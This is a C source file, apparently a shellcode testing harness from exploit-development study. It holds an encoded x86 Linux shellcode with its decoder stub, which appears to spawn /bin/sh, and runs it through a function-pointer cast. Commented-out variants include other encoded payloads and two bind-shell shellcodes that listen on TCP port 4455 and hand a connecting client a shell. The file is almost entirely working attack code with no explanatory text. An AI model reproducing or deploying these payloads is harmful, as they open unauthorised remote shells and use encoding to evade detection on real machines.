#include <stdio.h>

unsigned char shellcode[] = \
"\xba\x41\x41\x41\x41\xeb\x20\x5b\x8b\x0b\x43\x29\xd1\x75\xf9\x83\xc3\x03\x89\xdf\x89\xde\x43\x8a\x03\x88\x06\x83\xc3\x02\x46\x8b\x0b\x29\xd1\x75\xf2\xff\xe7\xe8\xdb\xff\xff\xff\x69\x75\x25\x41\x41\x41\x41\x70\x31\x64\xc0\x6e\x99\x70\x50\x79\x68\x75\x2f\x24\x2f\x25\x73\x62\x68\x6a\x68\x68\x2f\x23\x62\x67\x69\x72\x6e\x3d\x89\x2b\xe3\x26\x50\x23\x53\x6b\x89\x6d\xe1\x6f\xb0\x6e\x0b\x6a\xcd\x5e\x80\x68\x41\x41\x41\x41";
//"\xba\x41\x41\x41\x41\xeb\x20\x5b\x8b\x0b\x43\x29\xd1\x75\xf9\x83\xc3\x03\x89\xdf\x89\xde\x43\x8a\x03\x88\x06\x83\xc3\x02\x46\x8b\x0b\x29\xd1\x75\xf2\xff\xe7\xe8\xdb\xff\xff\xff\x26\x29\x41\x41\x41\x41\x68\x11\x21\x22\x7a\x33\x40\x44\x2b\x55\x6e\x66\x64\x77\x6c\x88\x76\x99\x6f\x41\x41\x41\x41";
//"\xba\x41\x41\x41\x41\xeb\x20\x5b\x8b\x0b\x43\x29\xd1\x75\xf9\x83\xc3\x03\x89\xdf\x89\xde\x43\x8a\x03\x88\x06\x83\xc3\x02\x46\x8b\x0b\x29\xd1\x75\xf2\xff\xe7\xe8\xdb\xff\xff\xff\x56\x55\x54\x41\x41\x41\x41\xc1\x11\x41\x41\x41\x41\x29\x29\x41\x41\x41\x41\x65\x11\x69\x22\x76\x33\x2a\x44\x70\x55\x29\x66\x74\x77\x40\x88\x74\x99\x29\x41\x41\x41\x41";
//"\xba\x41\x41\x41\x41\xeb\x20\x5b\x8b\x0b\x43\x29\xd1\x75\xf9\x83\xc3\x03\x89\xdf\x89\xde\x43\x8a\x03\x88\x06\x83\xc3\x02\x46\x8b\x0b\x29\xd1\x75\xef\xff\xe7\xe8\xdb\xff\xff\xff\x21\x6e\x41\x41\x41\x41\x2a\x11\x2d\x22\x64\x33\x71\x44\x75\x55\x3d\x66\x2a\x77\x5f\x88\x6a\x99\x74\x41\x41\x41\x41";
//"\xba\x41\x41\x41\x41\xeb\x1b\x5b\x8b\x0b\x43\x29\xd1\x75\xf9\x83\xc3\x03\x89\xdf\x8a\x43\x01\x88\x03\x43\x8b\x0b\x29\xd1\x75\xf4\xff\xe7\xe8\xe0\xff\xff\xff\x26\x3d\x41\x41\x41\x41\x6b\x11\x5f\x22\x76\x33\x29\x44\x25\x55\x29\x66\x24\x77\x5f\x88\x62\x99\x41\x41\x41\x41";
//"\x31\xc0\xb0\x66\x31\xdb\x53\xb3\x01\x53\x6a\x02\x89\xe1\xcd\x80\x89\xc2\x31\xc0\xb0\x66\x31\xdb\x53\xb3\x02\x66\x68\x11\x67\x66\x6a\x02\x89\xe6\x6a\x10\x56\x52\x89\xe1\xcd\x80\x31\xc0\x50\xb0\x66\x43\x43\x52\x89\xe1\xcd\x80\x31\xc0\x50\x50\xb0\x66\x43\x52\x89\xe1\xcd\x80\x89\xc3\x31\xc9\xb1\x02\x31\xc0\xb0\x3f\xcd\x80\x49\x79\xf7\xeb\x0b\x31\xc0\xb0\x0b\x5b\x31\xc9\x31\xd2\xcd\x80\xe8\xf0\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68";
//"\x6a\x66\x58\x6a\x01\x5b\x31\xf6\x56\x53\x6a\x02\x89\xe1\xcd\x80\x5f\x97\x93\xb0\x66\x56\x66\x68\x11\x67\x66\x53\x89\xe1\x6a\x10\x51\x57\x89\xe1\xcd\x80\xb0\x66\xb3\x04\x56\x57\x89\xe1\xcd\x80\xb0\x66\x43\x56\x56\x57\x89\xe1\xcd\x80\x59\x59\xb1\x02\x93\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x0b\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x41\x89\xca\xcd\x80";

main()
{
printf("Shellcode Length:  %d\n", sizeof(shellcode) - 1);
int (*ret)() = (int(*)())shellcode;
ret();
}
